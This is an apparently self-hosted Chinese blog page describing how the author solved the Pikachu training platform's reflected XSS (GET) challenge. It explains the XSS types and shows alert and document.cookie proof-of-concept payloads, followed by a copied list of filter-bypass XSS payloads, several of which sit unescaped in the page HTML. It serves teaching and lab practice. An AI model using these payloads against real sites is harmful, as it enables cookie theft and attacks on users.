@@ -1,0 +1,240 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>pikachu解题漏洞报告-反射型xss(get) - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="反射型xss(get)1.基本知识点1.1 XSS漏洞主要危害的是前端用户。XSS漏洞可以用来进行钓鱼攻击，前端JS挖矿，用户cookie获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制。
+,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="pikachu解题漏洞报告-反射型xss(get) - Hexo"/>
+    <meta name="twitter:description" content="反射型xss(get)1.基本知识点1.1 XSS漏洞主要危害的是前端用户。XSS漏洞可以用来进行钓鱼攻击，前端JS挖矿，用户cookie获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制。
+,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Hexo"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="pikachu解题漏洞报告-反射型xss(get) - Hexo"/>
+    <meta property="og:description" content="反射型xss(get)1.基本知识点1.1 XSS漏洞主要危害的是前端用户。XSS漏洞可以用来进行钓鱼攻击，前端JS挖矿，用户cookie获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制。
+,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">pikachu解题漏洞报告-反射型xss(get)</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">pikachu解题漏洞报告-反射型xss(get)</h1>
+        <div class="stuff">
+            <span>三月 14, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h1><h2 id="1-基本知识点"><a href="#1-基本知识点" class="headerlink" title="1.基本知识点"></a>1.基本知识点</h2><h3 id="1-1-XSS漏洞"><a href="#1-1-XSS漏洞" class="headerlink" title="1.1 XSS漏洞"></a>1.1 XSS漏洞</h3><p>主要危害的是前端用户。XSS漏洞可以用来进行钓鱼攻击，前端JS挖矿，用户cookie获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制。</p>
+<h3 id="1-2-XSS三种基本类型"><a href="#1-2-XSS三种基本类型" class="headerlink" title="1.2 XSS三种基本类型"></a>1.2 XSS三种基本类型</h3><p>1.21 反射型XSS：</p>
+<p>&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一次性，所见即所得，一般容易出现在搜索页面。</p>
+<p>1.22 存储型XSS：</p>
+<p>&lt;持久化&gt; 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
+<p>1.23 DOM型XSS：</p>
+<p>基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p>
+<h3 id="1-3-XSS漏洞基本原理"><a href="#1-3-XSS漏洞基本原理" class="headerlink" title="1.3 XSS漏洞基本原理"></a>1.3 XSS漏洞基本原理</h3><p>程序对输入输出控制不够严格，导致精心构造的脚本，输入浏览器前端，被当作有效代码解析执行，从而造成危害</p>
+<h3 id="1-4-测试流程"><a href="#1-4-测试流程" class="headerlink" title="1.4 测试流程"></a>1.4 测试流程</h3><p>1.41找到站点的输入点</p>
+<p>1.42输入一组’特殊字符+唯一识别字符’，点击提交后，查看返回的源码，是否有做对应的处理</p>
+<p>1.43结合唯一识别字符前后的语法，确定是否可以构造执行js的条件。</p>
+<p>1.44提交构造的脚本，看是否可以执行成功。</p>
+<h3 id="1-5-小窍门"><a href="#1-5-小窍门" class="headerlink" title="1.5 小窍门"></a>1.5 小窍门</h3><p>1.51 一般查询接口容易出现反射型XSS；留言板容易出现存储型XSS</p>
+<p>1.52 如果后台有过滤器，或者浏览器原因，可能导致script被过滤到，无法成功执行</p>
+<p>1.53 可以尝试变换不同的script，绕过过滤机制</p>
+<h2 id="2-解题过程"><a href="#2-解题过程" class="headerlink" title="2.解题过程"></a>2.解题过程</h2><p>2.1 进入pikachu漏洞平台</p>
+<p><img src="https://s2.loli.net/2021/12/13/y54sY7QxwKIz8ea.png" alt="20211213151100"></p>
+<p>2.2 输入框输入特殊字符+唯一识别符例如&lt;&gt;7788</p>
+<p>按F12查看代码，查找刚才输入的内容</p>
+<p><img src="https://s2.loli.net/2021/12/13/J1N9vQtgZwqmde4.png" alt="1639381076(1)"></p>
+<p>2.3 构造一个script代码，中间添加一个alert警告框</p>
+<p><code>&lt;script&gt;alert(&#39;水猴子&#39;)&lt;/script&gt;</code></p>
+<p>2.4将这段代码输入输入框</p>
+<p>发现不能完全输入，限制了输入长度</p>
+<p><img src="https://s2.loli.net/2021/12/13/ezSgAy9stpTHXRh.png" alt="1639381553(1)"></p>
+<p>F12查看，找到长度限制的代码位置，看到限制的20个字符</p>
+<p><img src="https://s2.loli.net/2021/12/13/xZCVkYzMmWvwaE9.png" alt="20211213154715"></p>
+<p>改成50个字符</p>
+<p>再次在输入框输入script代码，发现可以完整输入了</p>
+<p><img src="https://s2.loli.net/2021/12/13/mzCyx2WUK8GiOaS.png" alt="20211213154846"></p>
+<p>点击submit弹出水猴子警告框</p>
+<p><img src="https://s2.loli.net/2021/12/13/TrzpLle5G4fsvNF.png" alt="20211213154926"></p>
+<p>2.41 在源码修改限制长度，再次输入的时候又需要修改，不想在源代码修改限制输入长度，也可以直接在地址栏输入POC</p>
+<p><img src="https://s2.loli.net/2021/12/13/Kib4VXPS8ewtQRr.png" alt="1639383284(1)"></p>
+<p>回车后效果是一样的</p>
+<p><img src="https://s2.loli.net/2021/12/13/oCAYpslagcBQXhb.png" alt="1639383230(1)"></p>
+<p>以上，验证在XSS漏洞存在</p>
+<p>2.5 利用这个xss漏洞获得用户cookie</p>
+<p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p><img src="https://s2.loli.net/2021/12/13/74aoipjIXBFAwHL.png" alt="20211213161958"></p>
+<h2 id="3-知识点补充"><a href="#3-知识点补充" class="headerlink" title="3.知识点补充"></a>3.知识点补充</h2><h3 id="3-1-script："><a href="#3-1-script：" class="headerlink" title="3.1 script："></a>3.1 script：</h3><p>html超文本标记语言，此标签用于定义客户端脚本。可包含脚本语句。</p>
+<h3 id="3-2-alert"><a href="#3-2-alert" class="headerlink" title="3.2 alert:"></a>3.2 alert:</h3><p>alert是html dom中的一种脚本语言，中文意思是“提醒”。主要用法就是在定义了一定的函数后，通过执行相应的操作<br>，弹出对话框的语言。常用于对用户的提示信息。常见为alert函数</p>
+<h3 id="3-3-XSS-payload"><a href="#3-3-XSS-payload" class="headerlink" title="3.3 XSS payload"></a>3.3 XSS payload</h3><p>以下载荷链接<a target="_blank" rel="noopener" href="https://github.com/XSSPayloads/XSS">https://github.com/XSSPayloads/XSS</a></p>
+<p>“&gt;&lt;svg&#x2F;onload&#x3D;prompt(&#x2F;OPENBUGBOUNTY&#x2F;)&gt;<br>‘“–!&gt;&lt;img src&#x3D;x onerror&#x3D;alert(“OPENBUGBOUNTY”)&gt;<br>‘“&#x2F;&gt;&lt;svg&#x2F;onload&#x3D;prompt(&#x2F;OPENBUGBOUNTY&#x2F;)&gt;<br>‘“&gt;<script>alert("OPENBUGBOUNTY")</script><br>‘“&gt;<script>confirm("OPENBUGBOUNTY")</script><br>‘“&gt;<script>prompt("OPENBUGBOUNTY")</script><br>‘“&gt;&lt;svg&#x2F;onload&#x3D;alert(&#x2F;OPENBUGBOUNTY&#x2F;)&gt;<br>‘“&gt;&lt;svg&#x2F;onload&#x3D;confirm(&#x2F;OPENBUGBOUNTY&#x2F;)&gt;<br>‘“&gt;&lt;svg&#x2F;onload&#x3D;prompt(&#x2F;OPENBUGBOUNTY&#x2F;)&gt;<br>‘&gt;”&#x2F;&gt;&lt;svg&#x2F;onload&#x3D;prompt(&#x2F;OPENBUGBOUNTY&#x2F;)&gt;<br><Img src = x onerror = "javascript: window.onerror = alert; throw XSS"><br><img  src="x:gif" onerror="window['al\u0065rt'](0)"></img><br>&lt;svg&#x2F;onload&#x3D;prompt(&#x2F;OPENBUGBOUNTY&#x2F;)&gt;<br>jaVasCript:&#x2F;<em>-&#x2F;</em><code>/*\</code>&#x2F;<em>‘&#x2F;</em>“&#x2F;**&#x2F;(&#x2F;* *&#x2F;oNcliCk&#x3D;alert() )&#x2F;&#x2F;%0D%0A%0d%0a&#x2F;&#x2F;&lt;&#x2F;stYle&#x2F;&lt;&#x2F;titLe&#x2F;&lt;&#x2F;teXtarEa&#x2F;&lt;&#x2F;scRipt&#x2F;–!&gt;\x3csVg&#x2F;&lt;sVg&#x2F;oNloAd&#x3D;alert(“OPENBUGBOUNTY”)&#x2F;&#x2F;&gt;\x3exss.txt</p>
+<p>‘“&gt;&lt;svg&#x2F;onload&#x3D;prompt<code>1</code>&gt;<br>‘“&gt;&lt;svg&#x2F;onload&#x3D;alert<code>1</code>&gt;<br>‘“&gt;&lt;svg&#x2F;onload&#x3D;confirm<code>1</code>&gt;<br>‘“&gt;<script>alert<code>1</code></script> </p>
+<blockquote>
+<script>alert`1`</script> 
+<p>‘“&gt;&lt;svg onload&#x3D;prompt<code>openbugbounty</code>&gt;<br>‘“&gt;&lt;svg onload&#x3D;alert<code>openbugbounty</code>&gt;<br>‘“&gt;&lt;svg onload&#x3D;confirm<code>openbugbounty</code>&gt;<br>&lt;!’&#x2F;*!”&#x2F;*!&#x2F;‘&#x2F;*&#x2F;“&#x2F;*–!&gt;&lt;Input&#x2F;Autofocus&#x2F;*&#x2F;Onfocus&#x3D;confirm<code>OPENBUGBOUNTY</code>&#x2F;&#x2F;&gt;<Svg>&#x2F;<br>‘“&gt;&lt;svg&#x2F;onload&#x3D;alert(&#x2F;openbugbounty&#x2F;)&gt;</p>
+</blockquote>
+<p>site:&#x3D;&#x3D;<script>/**/alert(/test/)//</p>
+<h3 id="3-4-网页和代码"><a href="#3-4-网页和代码" class="headerlink" title="3.4 网页和代码"></a>3.4 网页和代码</h3><p>网页的所有内容都是由代码解析生成的。网页中有的，代码中就有。</p>
+<p>例如：title标签</p>
+<p>网页页面，title标签通常在浏览器标签页标题栏上</p>
+<p>代码中，在头部<head>中，是<head>中唯一必须包含的部分</p>
+<p>作用：让浏览器和读者明白本页的主题，所以在设定web文档title时要简介且概括性强让人一目了然。</p>
+<p>title标签中不能包含其他标签</p>
+<p>a标签等当中可以包含其他标签</p>
+<p>所以例如同样的搜索<script>，在百度中搜索内容在title标签中，就不会把<script>当作标签，仅仅当作简单字符。但如果有的网页放在了<a>标签中，就会将<script>当作标签处理，导致语句运行</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHNkazB1a3lqNl9kMl82P2U9aDgxYUZQ.wav"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHhtbVE0d01TYUZqQ2w4P2U9MGpOaFVZ.wav"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="toc-number">1.</span> <span class="toc-text">反射型xss(get)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">1.基本知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1 XSS漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-XSS%E4%B8%89%E7%A7%8D%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2 XSS三种基本类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.3.</span> <span class="toc-text">1.3 XSS漏洞基本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.4.</span> <span class="toc-text">1.4 测试流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-%E5%B0%8F%E7%AA%8D%E9%97%A8"><span class="toc-number">1.1.5.</span> <span class="toc-text">1.5 小窍门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">2.解题过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E5%85%85"><span class="toc-number">1.3.</span> <span class="toc-text">3.知识点补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-script%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 script：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-alert"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 alert:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-XSS-payload"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 XSS payload</span></a></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
